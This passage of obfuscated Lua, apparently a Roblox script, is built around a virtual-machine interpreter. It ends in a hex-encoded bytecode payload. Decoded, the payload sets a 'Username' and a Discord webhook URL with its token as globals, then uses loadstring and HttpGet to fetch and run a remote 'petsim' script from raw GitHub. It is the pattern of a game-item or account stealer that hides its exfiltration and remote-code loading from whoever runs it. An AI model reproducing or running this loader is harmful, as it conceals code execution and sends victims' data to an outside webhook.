															break;
														end
														if (0 == v75) then
															v76 = 0;
															v77 = nil;
															v75 = 1;
														end
													end
												end;
												return v50(v49(), {}, v31)(...);
											end
										end
									end
									v52 = 1;
								end
								if (v52 == 3) then
									if (v38 == 4) then
										local v57 = 0;
										while true do
											if (v57 == 0) then
												v45 = function()
													local v80 = 0;
													local v81;
													local v82;
													local v83;
													local v84;
													local v85;
													local v86;
													local v87;
													while true do
														if (v80 == 2) then
															v85 = nil;
															v86 = nil;
															v80 = 3;
														end
														if (0 == v80) then
															v81 = 0;
															v82 = nil;
															v80 = 1;
														end
														if (1 == v80) then
															v83 = nil;
															v84 = nil;
															v80 = 2;
														end
														if (v80 == 3) then
															v87 = nil;
															while true do
																local v120 = 0;
																while true do
																	if (v120 == 1) then
																		if (3 == v81) then
																			local v131 = 0;
																			while true do
																				if (v131 == 0) then
																					if (v86 == ((744 - ((2060 - (886 + 897)) + 467)) - ((1926 - 1047) - (205 + 65 + (1458 - 849))))) then
																						if (v85 == ((0 + 0) - (1103 - (1053 + 50)))) then
																							return v87 * ((0 - 0) - (0 + 0));
																						else
																							local v175 = 0;
																							local v176;
																							while true do
																								if (v175 == 0) then
																									v176 = 0;
																									while true do
																										if (v176 == 0) then
																											v86 = (1529 - ((2060 - (419 + 660)) + 547)) + 0;
																											v84 = 813 - (17 + 796);
																											break;
																										end
																									end
																									break;
																								end
																							end
																						end
																					elseif (v86 == ((838 - (60 + 46)) + (2030 - (666 + 49)))) then
																						return ((v85 == ((0 + 0) - 0)) and (v87 * ((1991 - (192 + 1138 + 660)) / 0))) or (v87 * NaN);
																					end
																					return v16(v87, v86 - (3027 - (6944 - 4940))) * (v84 + (v85 / (((13 - 8) - 3) ^ 52)));
																				end
																			end
																		end
																		if (v81 == 1) then
																			local v132 = 0;
																			while true do
																				if (v132 == 0) then
																					v84 = (2024 - 1195) - ((2188 - (229 + 1524)) + (828 - 435));
																					v85 = (v41(v83, (4 - 3) + 0 + 0, (43 - 31) + 8) * ((661 - (530 + 129)) ^ (603 - (95 + 24 + 452)))) + v82;
																					v132 = 1;
																				end
																				if (1 == v132) then
																					v81 = 2;
																					break;
																				end
																			end
																		end
																		break;
																	end
																	if (0 == v120) then
																		if (2 == v81) then
																			local v133 = 0;
																			while true do
																				if (v133 == 0) then
																					v86 = v41(v83, 21, 1668 - (442 + 746 + (1726 - 1277)));
																					v87 = ((v41(v83, 1879 - (1589 + 258)) == ((6471 - 5106) - ((223 - 132) + (1668 - (263 + 132))))) and -((2 - 1) + 0)) or (1 + 0);
																					v133 = 1;
																				end
																				if (v133 == 1) then
																					v81 = 3;
																					break;
																				end
																			end
																		end
																		if (v81 == (0 + 0)) then
																			local v134 = 0;
																			while true do
																				if (v134 == 0) then
																					v82 = v44();
																					v83 = v44();
																					v134 = 1;
																				end
																				if (1 == v134) then
																					v81 = 1 + 0;
																					break;
																				end
																			end
																		end
																		v120 = 1;
																	end
																end
															end
															break;
														end
													end
												end;
												v46 = nil;
												v57 = 1;
											end
											if (1 == v57) then
												v46 = function(v68)
													local v88 = 0;
													local v89;
													local v90;
													local v91;
													while true do
														if (v88 == 1) then
															v91 = nil;
															while true do
																local v121 = 0;
																while true do
																	if (v121 == 0) then
																		if (0 == v89) then
																			local v135 = 0;
																			while true do
																				if (v135 == 1) then
																					v89 = 1;
																					break;
																				end
																				if (v135 == 0) then
																					v90 = nil;
																					if not v68 then
																						local v173 = 0;
																						local v174;
																						while true do
																							if (v173 == 0) then
																								v174 = 0 - 0;
																								while true do
																									if (v174 == 0) then
																										v68 = v44();
																										if (v68 == (0 - 0)) then
																											return "";
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																					v135 = 1;
																				end
																			end
																		end
																		if (v89 == (205 - (27 + 175))) then
																			return v14(v91);
																		end
																		v121 = 1;
																	end
																	if (v121 == 1) then
																		if (v89 == (1416 - (50 + 1365))) then
																			local v136 = 0;
																			while true do
																				if (v136 == 1) then
																					v89 = 1 + 1;
																					break;
																				end
																				if (v136 == 0) then
																					v90 = v11(v30, v39, (v39 + v68) - (1 - 0));
																					v39 = v39 + v68;
																					v136 = 1;
																				end
																			end
																		end
																		if (v89 == 2) then
																			local v137 = 0;
																			while true do
																				if (1 == v137) then
																					v89 = 3;
																					break;
																				end
																				if (v137 == 0) then
																					v91 = {};
																					for v157 = 1902 - (883 + (4377 - 3359)), #v90 do
																						v91[v157] = v10(v9(v11(v90, v157, v157)));
																					end
																					v137 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v88 == 0) then
															v89 = 0 - 0;
															v90 = nil;
															v88 = 1;
														end
													end
												end;
												v38 = 5;
												break;
											end
										end
									end
									if (v38 == 2) then
										local v58 = 0;
										while true do
											if (v58 == 0) then
												v42 = function()
													local v92 = 0;
													local v93;
													local v94;
													while true do
														if (v92 == 0) then
															v93 = 0 + 0;
															v94 = nil;
															v92 = 1;
														end
														if (v92 == 1) then
															while true do
																local v122 = 0;
																while true do
																	if (0 == v122) then
																		if (v93 == (0 + 0)) then
																			local v138 = 0;
																			while true do
																				if (v138 == 1) then
																					v93 = 2 - 1;
																					break;
																				end
																				if (v138 == 0) then
																					v94 = v9(v30, v39, v39);
																					v39 = v39 + 1 + 0;
																					v138 = 1;
																				end
																			end
																		end
																		if (v93 == (1 - 0)) then
																			return v94;
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end;
												v43 = nil;
												v58 = 1;
											end
											if (v58 == 1) then
												v43 = function()
													local v95 = 0;
													local v96;
													local v97;
													local v98;
													while true do
														if (v95 == 0) then
															v96 = 0 + 0;
															v97 = nil;
															v95 = 1;
														end
														if (v95 == 1) then
															v98 = nil;
															while true do
																local v123 = 0;
																while true do
																	if (v123 == 0) then
																		if (v96 == 0) then
																			local v139 = 0;
																			while true do
																				if (1 == v139) then
																					v96 = 1;
																					break;
																				end
																				if (v139 == 0) then
																					v97, v98 = v9(v30, v39, v39 + ((3 + 0) - (1 - 0)) + (0 - 0));
																					v39 = v39 + 2 + 0;
																					v139 = 1;
																				end
																			end
																		end
																		if (v96 == 1) then
																			return (v98 * ((1125 - (103 + 12)) - 754)) + v97;
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end;
												v38 = 3;
												break;
											end
										end
									end
									break;
								end
								if (2 == v52) then
									if (v38 == 5) then
										local v59 = 0;
										while true do
											if (v59 == 0) then
												v47 = v44;
												v48 = nil;
												v59 = 1;
											end
											if (v59 == 1) then
												v48 = function(...)
													return {...}, v20("#", ...);
												end;
												v38 = 6;
												break;
											end
										end
									end
									if (v38 == 6) then
										local v60 = 0;
										while true do
											if (v60 == 1) then
												v50 = nil;
												v38 = 7;
												break;
											end
											if (v60 == 0) then
												v49 = nil;
												v49 = function()
													local v99 = 0;
													local v100;
													local v101;
													local v102;
													local v103;
													local v104;
													local v105;
													local v106;
													while true do
														if (v99 == 3) then
															v106 = nil;
															while true do
																local v124 = 0;
																while true do
																	if (v124 == 0) then
																		if (v100 == 0) then
																			local v140 = 0;
																			while true do
																				if (v140 == 2) then
																					v100 = 1;
																					break;
																				end
																				if (v140 == 0) then
																					v101 = {};
																					v102 = {};
																					v140 = 1;
																				end
																				if (v140 == 1) then
																					v103 = {};
																					v104 = {v101,v102,nil,v103};
																					v140 = 2;
																				end
																			end
																		end
																		if (v100 == 1) then
																			local v141 = 0;
																			while true do
																				if (v141 == 1) then
																					for v159 = 1, v105 do
																						local v160 = 0;
																						local v161;
																						local v162;
																						local v163;
																						while true do
																							if (v160 == 1) then
																								v163 = nil;
																								while true do
																									if (v161 == 1) then
																										if (v162 == (1 + 0)) then
																											v163 = v42() ~= ((3084 - (69 + 1166)) - ((2671 - 981) + 159));
																										elseif (v162 == (1478 - (507 + 969))) then
																											v163 = v45();
																										elseif (v162 == 3) then
																											v163 = v46();
																										end
																										v106[v159] = v163;
																										break;
																									end
																									if (v161 == 0) then
																										local v182 = 0;
																										while true do
																											if (0 == v182) then
																												v162 = v42();
																												v163 = nil;
																												v182 = 1;
																											end
																											if (1 == v182) then
																												v161 = 1;
																												break;
																											end
																										end
																									end
																								end
																								break;
																							end
																							if (v160 == 0) then
																								v161 = 0;
																								v162 = nil;
																								v160 = 1;
																							end
																						end
																					end
																					v104[1 + 2] = v42();
																					v141 = 2;
																				end
																				if (v141 == 2) then
																					v100 = 2;
																					break;
																				end
																				if (v141 == 0) then
																					v105 = v44();
																					v106 = {};
																					v141 = 1;
																				end
																			end
																		end
																		v124 = 1;
																	end
																	if (v124 == 1) then
																		if (v100 == 2) then
																			local v142 = 0;
																			while true do
																				if (v142 == 1) then
																					for v164 = 1 + (383 - (12 + 371)), v44() do
																						v103[v164] = v44();
																					end
																					return v104;
																				end
																				if (v142 == 0) then
																					for v166 = 1, v44() do
																						local v167 = 0;
																						local v168;
																						local v169;
																						while true do
																							if (v167 == 1) then
																								while true do
																									if (v168 == 0) then
																										v169 = v42();
																										if (v41(v169, 1946 - (1756 + 189), 3 - 2) == ((1338 + 209) - ((2930 - 2009) + (2308 - 1682)))) then
																											local v186 = 0;
																											local v187;
																											local v188;
																											local v189;
																											local v190;
																											while true do
																												if (1 == v186) then
																													v189 = nil;
																													v190 = nil;
																													v186 = 2;
																												end
																												if (v186 == 0) then
																													v187 = 0;
																													v188 = nil;
																													v186 = 1;
																												end
																												if (v186 == 2) then
																													while true do
																														if (v187 == 1) then
																															local v205 = 0;
																															while true do
																																if (v205 == 1) then
																																	v187 = 2;
																																	break;
																																end
																																if (v205 == 0) then
																																	v190 = {v43(),v43(),nil,nil};
																																	if (v188 == 0) then
																																		local v215 = 0;
																																		local v216;
																																		while true do
																																			if (v215 == 0) then
																																				v216 = 0;
																																				while true do
																																					if (v216 == 0) then
																																						v190[3] = v43();
																																						v190[907 - ((2178 - (168 + 1273)) + 166)] = v43();
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	elseif (v188 == (1726 - (1048 + 677))) then
																																		v190[6 - 3] = v44();
																																	elseif (v188 == (1279 - (979 + 298))) then
																																		v190[652 - (256 + (1800 - 1407))] = v44() - ((4 - 2) ^ (6 + (39 - 29)));
																																	elseif (v188 == (1941 - (1018 + 920))) then
																																		local v228 = 0;
																																		local v229;
																																		while true do
																																			if (v228 == 0) then
																																				v229 = 0;
																																				while true do
																																					if (v229 == 0) then
																																						v190[2 + 1] = v44() - ((2 - 0) ^ (3 + 13));
																																						v190[4] = v43();
																																						break;
																																					end
																																				end
																																				break;
																																			end
																																		end
																																	end
																																	v205 = 1;
																																end
																															end
																														end
																														if (v187 == 0) then
																															local v206 = 0;
																															while true do
																																if (1 == v206) then
																																	v187 = 1;
																																	break;
																																end
																																if (v206 == 0) then
																																	v188 = v41(v169, 1 + 1, 5 - (3 - 1));
																																	v189 = v41(v169, 4, 6);
																																	v206 = 1;
																																end
																															end
																														end
																														if (v187 == 3) then
																															if (v41(v189, 1465 - ((1502 - (620 + 3)) + 583), 3) == ((297 + 896) - (1109 + 83))) then
																																v190[4] = v106[v190[1472 - (404 + 1064)]];
																															end
																															v101[v166] = v190;
																															break;
																														end
																														if (2 == v187) then
																															local v208 = 0;
																															while true do
																																if (v208 == 1) then
																																	v187 = 3;
																																	break;
																																end
																																if (v208 == 0) then
																																	if (v41(v189, 28 - (6 + 21), (44 - (39 + 3)) - 1) == 1) then
																																		v190[2] = v106[v190[4 - 2]];
																																	end
																																	if (v41(v189, 2, 1478 - (233 + 1243)) == 1) then
																																		v190[(1355 - (957 + 395)) + 0 + 0] = v106[v190[5 - 2]];
																																	end
																																	v208 = 1;
																																end
																															end
																														end
																													end
																													break;
																												end
																											end
																										end
																										break;
																									end
																								end
																								break;
																							end
																							if (v167 == 0) then
																								v168 = 0;
																								v169 = nil;
																								v167 = 1;
																							end
																						end
																					end
																					for v170 = 3 - 2, v44() do
																						v102[v170 - 1] = v49();
																					end
																					v142 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v99 == 2) then
															v104 = nil;
															v105 = nil;
															v99 = 3;
														end
														if (v99 == 1) then
															v102 = nil;
															v103 = nil;
															v99 = 2;
														end
														if (0 == v99) then
															v100 = 0;
															v101 = nil;
															v99 = 1;
														end
													end
												end;
												v60 = 1;
											end
										end
									end
									v52 = 3;
								end
							end
						end
						break;
					end
				end
			end;
			v23("LOL!353O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403043O007D33ADA703073O001E5BCCD584A76403043O00AB57177003043O00C92E63152O033O001C6BC503073O006F1EA78791B95003043O00F9EB7AEC03073O009B93159E311F8103063O00D644A34257C103053O00B52BCD213603063O00203DE3B2474603083O00495390D735326A1103083O00557365726E616D6503083O00F270668129FB9B6F03063O00C23620CA1DB003073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313038343538313036343332352O39323531382F5069387235684C5A52483042504574695469574472614231694D6F5F33303941567475496D7664362D4E633834455A47556D4A414B4E4856432D6546496766597A2D4951030D3O006C6F6164696E677363722O656E03023O005F4703103O00081595EC70BF163D390996EC51B3283B03083O004B60E6981FD2455E030A3O00EDC41A5F4283A2D4E73603073O00BD97427F11E0D003053O006C19B5098403063O00387CCD7DB59303103O00E2FD207CC1EA7259DEFF3670D5B07C3B03043O00B19E521503053O00E81B22B21503083O00BC7E5AC6275567B803123O0078434D23E9C9F00F444B25A02OF45D4B542303073O002F22245780A79703053O00CEE5E1F1A903043O009A80998503133O00CAE55A16DFE0E35855E7EAFF5605C0FAA3115B03053O00898D3F75B403053O001F291963D203073O004B4C6117E6B34003133O00015AB34FAAAB797A727DB14FB7B2636E7C00FC03083O00522ED23DDEC2171D030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756100873O0012113O00013O0020125O0002001211000100013O002012000100010003001211000200013O002012000200020004001211000300053O00061A0003000A000100010004023O000A0001001211000300063O002012000400030007001211000500083O002012000500050009001211000600083O00201200060006000A00060900073O000100062O00183O00064O00188O00183O00044O00183O00014O00183O00024O00183O00053O001211000800014O0018000900073O00121B000A000B3O00121B000B000C4O00040009000B00022O0001000800080009001211000900014O0018000A00073O00121B000B000D3O00121B000C000E4O0004000A000C00022O000100090009000A001211000A00014O0018000B00073O00121B000C000F3O00121B000D00104O0004000B000D00022O0001000A000A000B001211000B00053O00061A000B002C000100010004023O002C0001001211000B00064O0018000C00073O00121B000D00113O00121B000E00124O0004000C000E00022O0001000C000B000C001211000D00084O0018000E00073O00121B000F00133O00121B001000144O0004000E001000022O0001000D000D000E001211000E00084O0018000F00073O00121B001000153O00121B001100164O0004000F001100022O0001000E000E000F000609000F0001000100062O00183O000D4O00183O000E4O00183O00084O00183O000C4O00183O00094O00183O000A4O00180010000F3O00121B001100183O00121B001200194O0004001000120002001208001000173O00121B0010001B3O0012080010001A4O0014001000013O0012080010001C3O0012110010001D4O0018001100073O00121B0012001E3O00121B0013001F4O00040011001300022O00180012000F3O00121B001300203O00121B001400214O00040012001400022O00030010001100120012110010001D4O0018001100073O00121B001200223O00121B001300234O00040011001300022O00180012000F3O00121B001300243O00121B001400254O00040012001400022O00030010001100120012110010001D4O0018001100073O00121B001200263O00121B001300274O00040011001300022O00180012000F3O00121B001300283O00121B001400294O00040012001400022O00030010001100120012110010001D4O0018001100073O00121B0012002A3O00121B0013002B4O00040011001300022O00180012000F3O00121B0013002C3O00121B0014002D4O00040012001400022O00030010001100120012110010001D4O0018001100073O00121B0012002E3O00121B0013002F4O00040011001300022O00180012000F3O00121B001300303O00121B001400314O00040012001400022O0003001000110012001211001000323O001211001100333O00201F00110011003400121B001300354O000C001100134O001D00103O00022O00170010000100012O00053O00013O00023O00023O00026O00F03F026O00704002284O000D00025O00121B000300014O000700045O00121B000500013O0004150003002300012O001000076O0018000800024O0010000900014O0010000A00024O0010000B00034O0010000C00044O0018000D6O0018000E00063O002O20000F000600012O000C000C000F4O001D000B3O00022O0010000C00034O0010000D00044O0018000E00013O002022000F000600012O0007001000014O001C000F000F001000101E000F0001000F0020220010000600012O0007001100014O001C00100010001100101E001000010010002O200010001000012O000C000D00104O0021000C6O001D000A3O000200200A000A000A00022O00190009000A4O000600073O000100040B0003000500012O0010000300054O0018000400024O0016000300044O000F00036O00053O00017O00283O00093O000A3O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000A3O000D3O000D3O000D3O000D3O000E3O00033O00028O00026O00F03F026O00704002473O00121B000200016O000300043O002O0E00010007000100020004023O0007000100121B000300016O000400043O00121B000200023O00261300020002000100020004023O0002000100121B000500013O002O0E0001000A000100050004023O000A000100261300030012000100020004023O001200012O001000066O0018000700044O0016000600074O000F00065O00261300030009000100010004023O0009000100121B000600013O0026130006003C000100010004023O003C00012O000D00076O0018000400073O00121B000700024O000700085O00121B000900023O0004150007003B00012O0010000B00014O0018000C00044O0010000D00024O0010000E00034O0010000F00044O0010001000054O001800116O00180012000A3O002O200013000A00022O000C001000134O001D000F3O00022O0010001000044O0010001100054O0018001200013O0020220013000A00022O0007001400014O001C00130013001400101E0013000200130020220014000A00022O0007001500014O001C00140014001500101E001400020014002O200014001400022O000C001100144O002100106O001D000E3O000200200A000E000E00032O0019000D000E4O0006000B3O000100040B0007001D000100121B000600023O00261300060015000100020004023O0015000100121B000300023O0004023O000900010004023O001500010004023O000900010004023O000A00010004023O000900010004023O004600010004023O000200012O00053O00017O00473O00173O00183O001B3O001B3O001C3O001D3O001E3O00203O00203O00223O00243O00243O00253O00253O00263O00263O00263O00263O00283O00283O00293O002B3O002B3O002C3O002C3O002D3O002D3O002D3O002D3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002E3O002D3O00303O00323O00323O00333O00343O00353O00383O00393O003A3O003C3O003D3O003F3O00873O00013O00013O00023O00023O00033O00033O00043O00043O00043O00043O00053O00063O00063O00073O00073O000E3O000E3O000E3O000E3O000E3O000E3O000E3O000F3O000F3O000F3O000F3O000F3O000F3O00103O00103O00103O00103O00103O00103O00113O00113O00113O00113O00113O00113O00123O00123O00123O00123O00133O00133O00133O00133O00133O00143O00143O00143O00143O00143O00143O00153O00153O00153O00153O00153O00153O003F3O003F3O003F3O003F3O003F3O003F3O003F3O00403O00403O00403O00403O00403O00413O00413O00423O00423O00433O00433O00433O00433O00433O00433O00433O00433O00433O00433O00443O00443O00443O00443O00443O00443O00443O00443O00443O00443O00453O00453O00453O00453O00453O00453O00453O00453O00453O00453O00463O00463O00463O00463O00463O00463O00463O00463O00463O00463O00473O00473O00473O00473O00473O00473O00473O00473O00473O00473O00483O00483O00483O00483O00483O00483O00483O00483O00", v17(), ...);
			break;
		end
		if (v24 == 0) then
			v0 = string.char;
			v1 = string.byte;
			v2 = string.sub;
			v3 = bit32 or bit;
			v24 = 1;
		end
	end
end
